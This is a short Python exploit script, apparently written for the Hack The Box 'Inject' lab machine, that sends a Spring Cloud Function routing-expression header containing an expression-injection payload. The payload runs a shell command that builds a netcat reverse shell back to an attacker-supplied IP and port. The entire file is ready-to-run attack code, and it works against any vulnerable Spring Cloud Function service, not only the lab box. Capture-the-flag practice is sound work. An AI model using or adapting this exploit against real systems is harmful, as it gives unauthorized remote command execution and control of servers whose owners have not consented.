import argparse
import requests


def send_request(target: int, ip: int, port: int, proxy=True) -> None:
    proxies = {'http': 'http://127.0.0.1:8080'}
    path = '/functionRouter'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Connection': 'close',
        'spring.cloud.function.routing-expression': f'T(java.lang.Runtime).getRuntime().exec(new String[] {{\'/bin/sh\', \'-c\', \'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f\'}})',
        'Content-Length': str(len('safarchand'))
    }
    r = requests.post(f'http://{target}:8080{path}', headers=headers, data='safarchand', proxies=proxies if proxy else None)

    if r.status_code == 500:
        print('check your netcat listener')


def main():
    parser = argparse.ArgumentParser(description='script to achieve initial foothold on HTB Inject Box')
    parser.add_argument('-t', help='ip address of the target machine', type=str, required=True)
    parser.add_argument('-i', help='ip address of the attacker machine', type=str, required=True)
    parser.add_argument('-p', help='port for the reverse shell', type=str, required=True)
    args = parser.parse_args()

    try:
        # Change proxy=True if you wanna intercept traffic using burpsuite
        send_request(args.t, args.i, args.p, proxy=False)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
